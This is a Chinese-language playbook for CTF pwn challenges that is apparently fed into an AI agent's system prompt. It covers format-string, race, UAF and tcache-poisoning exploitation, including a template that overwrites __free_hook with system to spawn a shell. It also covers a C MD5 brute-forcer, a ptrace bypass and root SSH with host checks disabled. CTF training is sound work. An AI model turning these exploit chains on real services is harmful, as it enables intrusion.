# Skill · Pwn 打法

> 这份文件会被自动拼进 AI 的系统提示词。改这里 = 改它的方法论，不用动代码。
> 你可以随时往下面「踩过的坑」里加条目。

## 0. 先认清这台机器

- 系统是 Windows，**没有 Linux 运行环境**，不能本地跑 ELF
- 但有 `objdump`（GNU binutils，**能反汇编 Linux ELF**）、`strings`、`nc`、`python`
- 没有 pwntools / gdb / checksec / readelf
- 工作目录里有 `conn.py`（零依赖连接工具），直接 `import conn` 用

**结论**：静态逆 + 远程打，这两个够用，不要因为"跑不起来"就放弃。

## 1. 标准流程（照着走，别跳）

1. **确认类型**：`objdump -h 文件` 头一行是 `file format elf64-x86-64`
2. **列出所有函数**：
   ```
   objdump -d -M intel --no-show-raw-insn 文件 > dis.txt
   ```
   抓函数名：`Select-String ">:" dis.txt`（Linux 用 grep）
3. **看数据段初始值**（金币、数组、预置字符串都在这里）：
   ```
   objdump -s -j .data 文件
   ```
4. **抓字符串**：`strings 文件` —— 重点看 `/flag`、菜单文案、`pthread_create`、`usleep`、`system`
5. **按调用链读**：`main` → `game`/主循环 → 各功能函数，只读和输入/金钱/背包/校验有关的
6. 找保护检查：`objdump -f` 看 `flags`，有 `EXEC_P` 说明没有 PIE（地址固定，可直接写死）

## 2. 看到这些特征，优先往这个方向想

| 代码里出现 | 大概率是 |
|---|---|
| `pthread_create` + `usleep` | **竞态**：睡眠期间状态没更新，可以重入 |
| `printf(buf)`（参数就是你的输入） | **格式化字符串**：任意读写 |
| `read(0, buf, 长度 > 缓冲区)` | **栈溢出** |
| `system("echo xxx")` 这种后门 | 如果参数是写死的，基本没用，别被带偏 |
| `%n` 系列写 GOT | 把某个函数 GOT 改成 `system@plt`，再触发调用 |

## 3. 用 conn.py 打远程

```python
import conn
c = conn.Conn("HOST", PORT)
print(c.recv_prompt())        # 等菜单提示符，别用 recv_until(b"> ")
c.sendline(b"3", b"0")        # 一次发多行
print(c.recv_prompt())
```

- `c.send(bytes)` 发原始字节（格式化字符串这种必须用 send，不能用 sendline，否则多一个 \n 会污染下一次 read）
- `c.recv(timeout)` 读一段
- `c.recv_prompt(token)` 等提示符（判断"缓冲区以 token 结尾"）
- `c.recv_until(token)` 读到出现 token（**注意**：`flag -> x` 里的 `> ` 会误匹配）

## 4. 踩过的坑（每次踩到就往这里加一条）

### 4.1 栈对齐：`system` 崩了，八成是这个

把返回地址改成某个函数入口时，如果**不是通过 `call` 进去的**（比如直接 `ret` 进函数），
栈指针会比正常情况差 8 字节。

- `puts` / `printf` 通常能容忍
- **`system` 不能** —— 它内部走 `posix_spawn`，SSE 指令要求 16 字节对齐，错位就 SIGSEGV

**判断方法**：把目标函数换成 `puts@plt` 试一下。
- 换成 puts 能跑、换成 system 就崩 → 是栈对齐问题，不是地址写错了
- 两个都崩 → 才是地址/GOT 写错了

**修法**：不要 `ret` 进函数，改成返回到某条 `call func` 指令
（比如 `main` 里那条 `call vuln`），让它自己 `call`，对齐就正了。

### 4.2 格式化字符串的参数偏移

如果缓冲区正好在函数栈帧的 `rsp` 上（常见于 `sub rsp,X` 之后 `lea rax,[rbp-X]`），
那么 `%6$p` 就是缓冲区开头，第 n 个参数在缓冲区偏移 `(n-6)*8`。
**先用 `%6$p.%7$p` 探一下确认，别凭感觉。**

### 4.3 字节写要按累计字符数升序排

用 `%hhn` 逐字节写地址时，格式串参数必须按"累计输出字符数"从小到大排。
写 0x00 的字节需要累计数正好是 256 的倍数，用 `%Nc` 补出来。
`%<pos>$<width>c` 可以一次输出任意多个字符，不占额外的地址表空间。

### 4.4 竞态题的窗口

`先加钱/先扣钱 → usleep → 最后才清标记` 这种顺序就是明牌：
在睡眠期间反复重入，每次都能通过检查。
用 `sendline` 连发几十条命令即可，注意收发节奏。

## 5. 什么时候必须停

- 3~4 步内连不上、或者服务没有任何回显 → 立刻 `finish` 说明卡在哪
- Pwn 盲打成功率极低，别把 20 次提交机会耗在一道题上

## 6. 元规则：崩了先做对照实验，别连着猜

这套方法论里最值钱的一条，比任何具体漏洞知识都通用。

**错误做法**：崩了 → 猜一个原因 → 直接改 → 又崩 → 再猜一个

**正确做法**：崩了 → 列出最可能的两三个原因 → **只改一个变量** → 一次就能二选一

### 两个真实例子

**例 1：改完 GOT，进程崩溃**
可疑原因：① GOT 地址/字节写错 ② 调用目标本身有问题

对照实验 → 把目标换成无害的 `puts@plt`：
- 能正常输出 → **写对了**，问题在 `system`（栈对齐）
- 还是崩 → 才是写错了

**例 2：发完 payload 一点回显都没有**
可疑原因：① 进程崩了 ② shell 起来了但不吭声

对照实验 → 用 `select()` 看 socket 有没有被对端关闭：
- 立刻 EOF → 进程崩了
- 静默但连接还在 → 大概率拿到 shell 了，接着发命令

### 一次对照实验的成本，永远小于三次盲猜

---

## 7. 本机有 WSL 之后：开一个动态调试闭环（强网杯 easytl 实战）

> 上面第 0 节假设「没有 Linux」。如果已经 `wsl --import` 了一个 glibc 发行版，
> 那就多了一整套武器：**gdb / openssl / gcc / python3**。这几件东西把
> 「静态猜」升级成「跑起来看」。

### 7.1 环境（一次装好，反复用）

```powershell
wsl --import ubuntu2404 E:\_wsl\ubuntu2404 ubuntu-base-24.04-base-amd64.tar.gz
wsl -d ubuntu2404 -e bash -c "apt-get update && apt-get install -y gdb binutils python3 openssl gcc libssl-dev"
```

- WSL 里用 `/mnt/e/...` 访问 Windows 盘符；Python 里写 `r"E:\a\b"` 在 WSL 下**不存在**
- 一律 **写 .sh / .gdb 文件再 `wsl -d ubuntu2404 -e bash 脚本.sh`**，
  不要在 PowerShell 里拼内联引号（`$`、`"`、`(` 会被吃掉，反复踩）
- 输出重定向到文件，再用 `read` 工具看，避免管道截断

### 7.2 gdb 脚本的三个必备开关

```gdb
set follow-fork-mode child      # 服务器 fork 处理连接时必须跟 child，否则断点永远打不到
set detach-on-fork on
handle SIGSEGV stop print       # 抓堆破坏；不设的话子进程悄悄死掉，你只看到 EOF
```

断点可以直接打在**内部地址**上（strip 掉的二进制没有符号）：

```gdb
break *0x403ed8                 # 某个 handler 的入口
commands
  silent
  printf ">> handler called ssl=%p\n", $rdi
  continue
end
```

**判据**：日志里没出现 `>> xxx` = 这个分支根本没执行；出现了，才轮到研究"它做了什么"。

### 7.3 WSL 专属的坑

- `pkill -f easytl_p` 会**匹配到 bash 自己的命令行**（脚本名里含这个串），把 shell 也杀掉，
  表现是"命令无输出、exit 1"。用 **`pkill -x 进程名`**（精确匹配进程名）
- 每个 `pwsh` 调用是全新进程，`cd` 只在那一次有效，用 `workdir` 或脚本内 `cd`

---

## 8. 协议逆向：从 dispatch 表到能跑通的客户端

抓一个**自定义协议**的网络题，标准四步：

### 8.1 找 dispatch

在 main 附近找一串连续的 `cmp $0xXXXXXXXX,%eax` + `je`，
立即数就是**命令字**，每个 `je` 跳到的函数就是 handler：

```
0x40437b: cmpl $0xdc375626,-4(%rbp)  je 0x40441d   → handler A
0x404395: cmpl $0xd21fef03,-4(%rbp)  je 0x40442b   → handler B
0x404439: default                                  → "error"
```

### 8.2 每个 handler 只问三件事

1. 读**多少字节**、校验什么
2. 往结构体哪个**偏移**写什么（这是后面打堆的全部依据）
3. 回什么

easytl 的结论（可直接类比）：

| 命令 | 语义 | 关键点 |
|---|---|---|
| create | 建 note | `node[0:16]=MD5(payload)` 当查找键 |
| fetch | 取 note | 回发 `payload[len]`；有一个 `memcmp` 门禁分支 |
| encrypt/decrypt | 原地加解密 | **key/iv 都来自客户端字段** → 加密是幌子 |
| update | 改内容+改长度 | `free(旧payload)` + `calloc` + **重算 MD5** |
| delete | 删 note | 摘链 + `free(payload)` + `free(node)` |

### 8.3 踩坑：handler 调两次 `SSL_read`

两段数据必须**分两个 TLS record 发**，中间要 `sleep`：

```python
ss.sendall(struct.pack("<I", CMD) + key)
time.sleep(0.3)                     # 让第一次 SSL_read 只拿到 16 字节
ss.sendall(struct.pack("<I", len(data)) + data)
```

一次 `sendall` 全发 → 第一次读把后面也吃进缓冲区 → `if (ret != 0x10) exit(1)`
→ 你只看到"连接突然 EOF"。**这个坑会让一个功能看起来完全不可用，实际只是发包节奏错了。**

---

## 9. 门禁分支的正确验证法：打补丁做对照

代码里出现 `if (!memcmp(node, <16字节常量>, 16)) { ... }` 这种门禁时，
**不要靠读汇编猜它做什么**：

1. 复制一份二进制，把常量改成 `MD5("AAAAAAAA")`（`.rodata` vaddr → 文件偏移要换算）
2. 本地起服务，`create("AAAAAAAA")` 制造命中
3. 看真实行为

easytl 上这么做发现了两件事：

- **fetch 的门禁分支只做 `strcat(buf, payload)`**，不打印任何东西（我原以为它 printf 出 flag，差点白干）
- **update 的门禁分支是 `free(payload)` 且不清指针 = UAF**；打补丁后复现出 `fetch` 返回
  `d56d582200000000`（一个堆地址）

**通用收获**：门禁分支的真实语义（打印 / free / 溢出）只能靠"造一个命中"确认，
静态读极容易把 `strcat` 看成 `printf`。

---

## 10. 哈希原像爆破模板（C + 多线程，秒级）

需要 `MD5(x) == 目标` 时别用 Python，用 OpenSSL + pthread：

```c
#include <openssl/md5.h>
static void *worker(void *p) {          /* 每个线程固定首字符，其余位跑 odometer */
    int idx[64]; memset(idx,0,sizeof idx); idx[0] = first;
    for (;;) {
        for (int i=0;i<LEN;i++) buf[i]=ALPHA[idx[i]];
        MD5(buf, LEN, d);
        if (!memcmp(d, TARGET, 16)) { /* 命中 */ }
        /* 同时试 "flag{" + buf + "}" 包装形式 */
        int i=1; while (i<LEN && ++idx[i]>=AN) { idx[i]=0; i++; }
        if (i==LEN) break;
    }
}
```

```
gcc -O3 -pthread -o brute brute.c -lcrypto
```

- 32 核实测 **~30M hash/s**：`36^6 × 2 ≈ 2 分钟`，`16^8 × 2 ≈ 5 分钟`
- 覆盖顺序：`[a-z0-9]^6`、`[a-zA-Z0-9]^5`、`hex^8`、`HEX^8`，
  每种都**同时试裸串和 `flag{...}` 包装**
- **失败也要留结论**：easytl 两个门禁常量在约 250 亿候选里都没有原像
  → 它们不是"短且可猜"的字符串（很可能作者手改过，是诱饵）
  → 这个否定结论本身就把方向从"猜字符串"推回"找别的入口"

---

## 11. 门禁类题目的判断表

| 现象 | 结论 |
|---|---|
| 两个门禁常量**只差几个字节** | 不可能是两个独立 MD5（概率 ~2^-64），必有一个是手改的 |
| 门禁分支的 payload 必须"长"才能溢出 | 长串原像不可爆 → 该分支只能靠**任意写直接改 node 头**进去 |
| 找到 `free` 但不清指针 | UAF → 用 `fetch` 漏堆、用原地加密（CFB 等）改 tcache fd |
| 加密的 key/iv 来自客户端字段 | 加密是幌子，**原地加密就是一个可控写原语** |

**easytl 最终结论**：完整链（UAF → tcache 劫持 → 任意写 → 改写 node 头 → strcat 栈溢出 → ROP）
在打补丁环境里验证到了"堆泄漏"这一步，卡在两道门禁的 MD5 原像上。
**门禁原像爆不出来时，止损点到了**——回到"有没有别的入口"，或者直接问主办方。
这不是能力问题，是信息缺失。

---

## 12. 环境更新：现在有远程 Linux 了

第 0 节写的「系统是 Windows，**没有 Linux 运行环境**，不能本地跑 ELF」**已经过时**。

现在有一台 Kali 虚拟机，Windows 主机通过 SSH 免密直连，可以：

| 能力 | 命令 |
|---|---|
| 远程跑 ELF | `ssh ... "chmod +x ./bin && ./bin < input"` |
| 动态调试 | `gdb -q -batch -x script.gdb ./bin` |
| dump 内存 / 调内部函数 | gdb 里 `x/64xb $rsp` / `call ((int(*)(int))0x402747)(0)` |
| 传文件 | `scp -i <key> 本地文件 root@<IP>:/root/` |
| 伪造 /proc 绕 ptrace | `unshare(CLONE_NEWNS)` + tmpfs 覆盖 `/proc` |

关键前置：

```bash
sudo systemctl start ssh && sudo systemctl enable ssh
mkdir -p ~/.ssh && echo "<公钥>" >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys
```

```powershell
ssh -i $env:USERPROFILE\.ssh\id_kali_ww -o BatchMode=yes `
    -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL root@<VM_IP> "id"
```

**完整配置步骤和踩坑记录见 `skills/reverse.md` 的「8. 远程 Linux 执行环境」到
「13. 什么时候必须止损」六节。**

**实战建议**：能远程跑就别纯静态。静态读 `strcat` 很容易看成 `printf`，
造一个命中让程序自己告诉你语义，快十倍。

---

## 13. `__free_hook = system` 之后的三道坎 ★

走到这一步说明堆结构已经打通了，**剩下三件事，每件都能让 26 步白费**。

### 第一件：判断"崩了"还是"活着没回显"

> **崩了**：`free()` 之后连接立刻断（`recv` 阻塞或返回 `b''`），后续命令无响应。
> **活着**：连接还在，但没有任何输出。

诊断代码（触发后马上探测）：

```python
delete(6)                 # 触发 free -> system("/bin/sh")
time.sleep(0.5)
try:
    c.sendline(b"echo PWNED; id")
    time.sleep(0.5)
    print(c.recv(2.0))    # 没反应 = 崩了
except Exception as e:
    print("连接异常 = 崩了：", e)
```

**这两种情况要修的地方完全不同，先分清再动手。**

### 第二件：崩了的三大原因（按概率）

**① 偏移对错了 libc 版本** ← 最常见

- **一定要用题目自带的 libc**，不要用本机的、不要用记忆里的
- 核对版本：
  ```python
  data = open('libc.so.6','rb').read()
  i = data.find(b'GNU C Library')
  print(data[i:i+90])      # 例：Ubuntu GLIBC 2.31-0ubuntu9.15
  ```
- 同一个 2.31，不同 Ubuntu patch 版本偏移可能不一样！
- 从 ELF 动态符号表直接取，别猜：
  ```python
  objdump -T libc.so.6 | grep -E "system|__free_hook|__malloc_hook"
  ```
- `main_arena` 没导出，用 `__malloc_hook + 0x10` 推；
  unsorted bin 泄漏的 `main_arena+96` = `__malloc_hook + 0x10 + 0x60`

**② 栈对齐**

`system` 内部用 `movaps`，要求 16 字节对齐。
`__free_hook` 被调用的那一瞬间栈常常差 8 字节，直接 `SIGSEGV`。

- 症状：hook 值明明对，一 free 就崩
- 尝试：`system` 的相邻地址（有些环境 +1 就对齐了）、
  或者直接用 **one_gadget**（约束更明确，对齐问题由它自己处理）

**③ 写的不是那个 chunk**

- `delete(idx)` 的 idx 必须和 `edit(idx, "/bin/sh")` 的 idx **是同一个**
- 中途 `create` 会改变 tcache 状态，idx 可能已经指向别的 chunk
- 验证：`show(idx)` 打印出来，确认内容真是 `/bin/sh`

### 第三件：活着但没回显

**① 你没发命令** ← 最常见

`free()` 只是触发 `system("/bin/sh")`，shell 起来之后**在等你输入**：

```python
delete(6)
time.sleep(0.3)                  # 等 shell 起来
c.sendline(b"cat /flag; id")     # ← 这一步不能少
time.sleep(0.5)
print(c.recv(3.0))
```

**② `recv` 把 shell 的提示符吃掉了**

分两次 recv，或者先 `recv` 到一个已知标记再发命令。

**③ stdin 被关掉了**

不要对 socket 调 `shutdown(SHUT_WR)`；也不要在最后 `close()` 之前发命令。

### 验证顺序（照着走）

```
1. 版本对不对？   → strings/ELF 里读 "GNU C Library"
2. 偏移对不对？   → objdump -T 题目自带 libc 里取
3. hook 写对没？  → show 出来 hex，和 libc+system 比对
4. /bin/sh 在吗？ → show 那个 chunk
5. idx 一致吗？   → delete 的 idx == edit 的 idx
6. 崩没崩？       → 触发后探测连接
7. 发命令了吗？   → delete 之后必须 sendline
```

**任何一步跳过，都可能让前面全白做。**

### 真实事故（强网杯 12203 "简单的堆题"）

模型的表现：

- ✅ 泄漏 heap、libc 基址
- ✅ 写入 `__free_hook = system`，读回验证通过
- ✅ 写入 `/bin/sh`
- ❌ 脚本最后一行是 `edit(6, b"/bin/sh")`，**既没 `delete(6)` 也没发命令**
- ❌ 26 步用尽

补上 `delete(6)` 再人工触发后，进程**直接崩溃** →
说明还差"栈对齐"这一环（或者需要换 one_gadget）。

> **教训：`__free_hook` 写完不等于结束，真正的工作在后面三步。
> 每走一步都要"验证 + 探测"，不要一口气写完再看结果。**



---

## 14. tcache 三部曲：固定套路，别重新推导 ★

**堆题里 80% 是这个套路。记住配方，不要每次现场推导 tcache 的内部结构。**

### 结构（背下来就不会错）

| 事实 | 含义 |
|---|---|
| tcache 的 `next` 指针存在 **chunk 用户数据区偏移 0** | 也就是 `chunk+0x10` |
| `malloc` 返回的是 `chunk+0x10` | 所以写目标地址时要 **-0x10** |
| `free` 后前 8 字节被覆盖成下个地址 | 所以 `show(freed)` **能读出 tcache next** |
| unsorted bin 的 fd/bk 指向 `main_arena+96` | 能泄漏 libc |

### 标准五步（UAF + tcache poisoning + `__free_hook`）

```python
# 0. 准备：两个同大小 chunk
create(0, 0x18); create(1, 0x18)

# 1. 泄漏 heap（free 两个，show 其中一个）
delete(0); delete(1)
raw = show(1)[:6]              # 前 6 字节就是 heap 地址
heap = u64(raw)                # tcache next

# 2. 泄漏 libc（free 一个大 chunk 进 unsorted bin）
create(4, 0x500); delete(4)
libc = u64(show(4)[:6]) - 0x1ecbe0      # main_arena+96 的偏移（要对版本）

# 3. tcache poisoning：改 next 指向 __free_hook
edit(1, p64(libc + FREE_HOOK - 0x10))   # ← 注意 -0x10！
create(2, 0x18)                          # 拿到原 chunk
create(3, 0x18)                          # 拿到 __free_hook

# 4. 写入 system
edit(3, p64(libc + SYSTEM))

# 5. 造 /bin/sh 并触发
create(6, 0x18); edit(6, b"/bin/sh\x00")
delete(6)                     # free(chunk) -> system("/bin/sh")
time.sleep(0.3)
sendline(b"cat /flag")        # ← 必须发命令！

# 6. 收尾（如果 system 崩了，看第 13 节：栈对齐 / 换 one_gadget）
```

### 每次都先确认的三个数

1. **libc 版本**（决定所有偏移）→ `strings libc.so.6 | grep "GNU C Library"`
2. **`__free_hook` / `system` 偏移** → `objdump -T libc.so.6`
3. **`main_arena+96` → libc 基址的偏移** → 和版本对应

**这三个数错了，后面全废。** 用题目自带的 libc，不要用记忆里的。

### 不要做的事

- ❌ 不要在现场推导"tcache next 到底存在哪"——查表，1 秒的事
- ❌ 不要假设 `edit` 的指针是 chunk 开头（它是 `chunk+0x10`）
- ❌ 不要忘记触发和发命令（见第 13 节）

### 真实事故（强网杯 12203，LitCTF2024 heap）

原题、标准套路，模型花了 37+ 步还在纠结 tcache 的 `next` 存哪。
**这不是智力问题，是没记住配方。**
